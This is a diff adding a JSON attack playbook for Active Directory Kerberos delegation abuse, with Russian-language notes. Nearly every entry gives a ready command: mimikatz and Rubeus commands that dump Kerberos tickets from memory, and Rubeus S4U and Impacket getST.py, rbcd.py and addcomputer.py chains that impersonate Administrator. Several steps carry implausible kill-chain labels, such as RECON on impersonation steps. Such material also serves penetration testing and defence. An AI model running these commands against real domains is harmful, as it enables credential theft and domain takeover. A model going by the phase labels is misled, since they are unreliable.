@@ -1,0 +1,242 @@
+[
+  {
+    "condition": "Kerberos Delegation",
+    "attack_type": "Reconnaissance (General)",
+    "tool": "findDelegation.py",
+    "req": "Domain User Credentials",
+    "command": "findDelegation.py \"<domain>\"/\"<user>\":\"<password>\"",
+    "profit": "Delegation Info",
+    "critical_note": "Поиск всех видов делегирования в домене с помощью скрипта из Impacket.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Kerberos Delegation",
+    "attack_type": "Reconnaissance (BloodHound)",
+    "tool": "Cypher Query",
+    "req": "BloodHound Data",
+    "command": "MATCH (c:Computer {unconstraineddelegation:true}) RETURN c",
+    "profit": "Unconstrained Computers",
+    "critical_note": "Поиск компьютеров с неограниченным делегированием через BloodHound.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Kerberos Delegation",
+    "attack_type": "Reconnaissance (BloodHound)",
+    "tool": "Cypher Query",
+    "req": "BloodHound Data",
+    "command": "MATCH (u:User {unconstraineddelegation:true}) RETURN u",
+    "profit": "Unconstrained Users",
+    "critical_note": "Поиск пользователей с неограниченным делегированием через BloodHound.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Kerberos Delegation",
+    "attack_type": "Reconnaissance (BloodHound)",
+    "tool": "Cypher Query",
+    "req": "BloodHound Data",
+    "command": "MATCH p=((:Base)-[:AllowedToDelegate]->(:Computer)) RETURN p",
+    "profit": "Constrained Delegation Paths",
+    "critical_note": "Поиск путей ограниченного делегирования (Constrained Delegation).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Kerberos Delegation",
+    "attack_type": "Reconnaissance (BloodHound)",
+    "tool": "Cypher Query",
+    "req": "BloodHound Data",
+    "command": "MATCH p=shortestPath((u:User)-[*1..]->(c:Computer {name:\"<MYTARGET.FQDN>\"})) RETURN p",
+    "profit": "Path to Target",
+    "critical_note": "Поиск кратчайшего пути от пользователя до целевого компьютера.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Kerberos Delegation",
+    "attack_type": "Unconstrained Delegation (Triage)",
+    "tool": "mimikatz",
+    "req": "Local Admin on Unconstrained Server",
+    "command": "mimikatz privilege::debug sekurlsa::tickets /export",
+    "profit": "Exported Tickets",
+    "critical_note": "Экспорт всех билетов из памяти процесса LSASS с помощью Mimikatz.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Kerberos Delegation",
+    "attack_type": "Unconstrained Delegation (Dump KRBTGT)",
+    "tool": "Rubeus",
+    "req": "Local Admin on Unconstrained Server",
+    "command": "Rubeus.exe dump /service:krbtgt /nowrap",
+    "profit": "TGT Tickets",
+    "critical_note": "Дамп TGT билетов, фильтрация по сервису krbtgt.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Kerberos Delegation",
+    "attack_type": "Unconstrained Delegation (Dump Specific UID)",
+    "tool": "Rubeus",
+    "req": "Local Admin on Unconstrained Server",
+    "command": "Rubeus.exe dump /uid:0xdeadbeef /nowrap",
+    "profit": "Specific User Ticket",
+    "critical_note": "Дамп билета конкретного пользователя по его UID.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Kerberos Delegation",
+    "attack_type": "Unconstrained Delegation (Monitor)",
+    "tool": "Rubeus",
+    "req": "Local Admin on Unconstrained Server",
+    "command": "Rubeus.exe monitor /interval:5",
+    "profit": "Real-time TGT Capture",
+    "critical_note": "Мониторинг новых билетов в реальном времени (каждые 5 секунд).",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Kerberos Delegation",
+    "attack_type": "Constrained Delegation (With Protocol Transition) - Step 1",
+    "tool": "Rubeus",
+    "req": "UAC: TRUST_TO_AUTH_FOR_DELEGATION",
+    "command": "Rubeus.exe hash /password:<password>",
+    "profit": "User Hash",
+    "critical_note": "Получение хеша пароля пользователя для дальнейшего использования.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Kerberos Delegation",
+    "attack_type": "Constrained Delegation (With Protocol Transition) - Step 2",
+    "tool": "Rubeus",
+    "req": "User Hash",
+    "command": "Rubeus.exe asktgt /user:<user> /domain:<domain> /aes256:<AES 256 hash>",
+    "profit": "TGT Ticket",
+    "critical_note": "Запрос TGT билета с использованием AES256 хеша.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Kerberos Delegation",
+    "attack_type": "Constrained Delegation (With Protocol Transition) - Step 3",
+    "tool": "Rubeus",
+    "req": "Valid TGT",
+    "command": "Rubeus.exe s4u /ticket:<ticket> /impersonateuser:<admin_user> /msdsspn:<spn_constrained> /altservice:<altservice> /ptt",
+    "profit": "Service Ticket (TGS) -> PTT",
+    "critical_note": "Выполнение S4U атаки и импорт полученного билета в текущую сессию (Pass-The-Ticket).",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Kerberos Delegation",
+    "attack_type": "Constrained Delegation (With Protocol Transition) - Impacket",
+    "tool": "impacket (getST.py)",
+    "req": "UAC: TRUST_TO_AUTH_FOR_DELEGATION",
+    "command": "getST.py -spn <spn> -impersonate Administrator -dc-ip <dc_ip> <domain>/<user>:<password> -altservice <altservice>",
+    "profit": "Service Ticket (ccache)",
+    "critical_note": "Получение сервисного билета для администратора через механизм S4U2Proxy.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Kerberos Delegation",
+    "attack_type": "Constrained Delegation (No Protocol Transition) - Step 1",
+    "tool": "impacket (addcomputer.py)",
+    "req": "MachineAccountQuota > 0",
+    "command": "addcomputer.py -computer-name '<computer_name>' -computer-pass '<computerPassword>' -dc-host <dc> -domain-netbios <domain_netbios> <domain>/<user>:<password>",
+    "profit": "New Machine Account",
+    "critical_note": "Создание подконтрольной учетной записи компьютера (Computer X).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Kerberos Delegation",
+    "attack_type": "Constrained Delegation (No Protocol Transition) - Step 2",
+    "tool": "impacket (rbcd.py)",
+    "req": "Active Directory Write Rights",
+    "command": "rbcd.py -delegate-from 'rbcd_con$' -delegate-to <constrained>$ -dc-ip <dc> -action 'write' -hashes <hash> <domain>/<constrained>$",
+    "profit": "RBCD Configured",
+    "critical_note": "Настройка делегирования от созданного компьютера к целевому аккаунту (делегирование 'write').",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Kerberos Delegation",
+    "attack_type": "Constrained Delegation (No Protocol Transition) - Step 3",
+    "tool": "impacket (getST.py)",
+    "req": "Configured Delegation",
+    "command": "getST.py -spn host/<constrained> -impersonate Administrator -dc-ip <dc_ip> <domain>/<rbcd_con>$:<rbcd_con_pass>",
+    "profit": "Intermediate Ticket",
+    "critical_note": "Получение билета от имени администратора на промежуточный сервис.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Kerberos Delegation",
+    "attack_type": "Constrained Delegation (No Protocol Transition) - Step 4",
+    "tool": "impacket (getST.py)",
+    "req": "Intermediate Ticket",
+    "command": "getST.py -spn <constrained_spn>/<target> -hashes <hash> <domain>/<constrained>$ -impersonate Administrator -dc-ip <dc_ip> -additional-ticket <previous_ticket>",
+    "profit": "Final Service Ticket",
+    "critical_note": "Использование промежуточного билета для получения доступа к целевому сервису (через S4U2Proxy).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Kerberos Delegation",
+    "attack_type": "RBCD (Resource-Based) - Step 1: Create Account",
+    "tool": "impacket (addcomputer.py)",
+    "req": "MachineAccountQuota > 0",
+    "command": "addcomputer.py -computer-name '<computer_name>' -computer-pass '<computerPassword>' -dc-host <dc> -domain-netbios <domain_netbios> <domain>/<user>:<password>",
+    "profit": "Attacker Machine Account",
+    "critical_note": "Создание фальшивого аккаунта компьютера для атаки.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Kerberos Delegation",
+    "attack_type": "RBCD (Resource-Based) - Rubeus Path - Step 2",
+    "tool": "Rubeus",
+    "req": "Machine Account Credentials",
+    "command": "Rubeus.exe hash /password:<computer_pass> /user:<computer> /domain:<domain>",
+    "profit": "Machine Hash",
+    "critical_note": "Генерация хеша для созданного аккаунта компьютера.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Kerberos Delegation",
+    "attack_type": "RBCD (Resource-Based) - Rubeus Path - Step 3",
+    "tool": "Rubeus",
+    "req": "Write Permission on Target",
+    "command": "Rubeus.exe s4u /user:<fake_computer$> /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/<victim.domain.local> /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt",
+    "profit": "Admin TGS -> PTT",
+    "critical_note": "Полная цепочка атаки RBCD через Rubeus: получение билета на cifs/target от имени админа.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Kerberos Delegation",
+    "attack_type": "RBCD (Resource-Based) - Impacket Path - Step 2",
+    "tool": "impacket (rbcd.py)",
+    "req": "Write Permission on Target",
+    "command": "rbcd.py -delegate-from <computer>$ -delegate-to <target>$ -dc-ip <dc> -action 'write' <domain>/<user>:<password>",
+    "profit": "RBCD Configured on Target",
+    "critical_note": "Настройка атрибута msDS-AllowedToActOnBehalfOfOtherIdentity на целевом компьютере.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Kerberos Delegation",
+    "attack_type": "RBCD (Resource-Based) - Impacket Path - Step 3",
+    "tool": "impacket (getST.py)",
+    "req": "RBCD Configured",
+    "command": "getST.py -spn host/<dc_fqdn> <domain>/<computer_account>:<computer_pass> -impersonate Administrator --dc-ip <dc_ip>",
+    "profit": "Service Ticket",
+    "critical_note": "Получение сервисного билета с правами администратора после настройки RBCD.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Kerberos Delegation",
+    "attack_type": "S4U2Self Abuse - Step 1",
+    "tool": "impacket (getTGT.py)",
+    "req": "Machine Account Hash",
+    "command": "getTGT.py -dc-ip <dc_ip> -hashes :<machine_hash> <domain>/<machine>$",
+    "profit": "Machine TGT",
+    "critical_note": "Получение TGT билета для скомпрометированного аккаунта компьютера.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Kerberos Delegation",
+    "attack_type": "S4U2Self Abuse - Step 2",
+    "tool": "impacket (getST.py)",
+    "req": "Machine TGT",
+    "command": "getST.py -self -impersonate \"admin\" -altservice \"cifs/<machine>\" -k -no-pass -dc-ip \"DomainController\" \"<domain>/<machine>$\"",
+    "profit": "Local Admin Ticket",
+    "critical_note": "Использование S4U2Self для получения билета на локальный сервис от имени администратора домена.",
+    "kill_chain_phase": "RECON"
+  }
+]
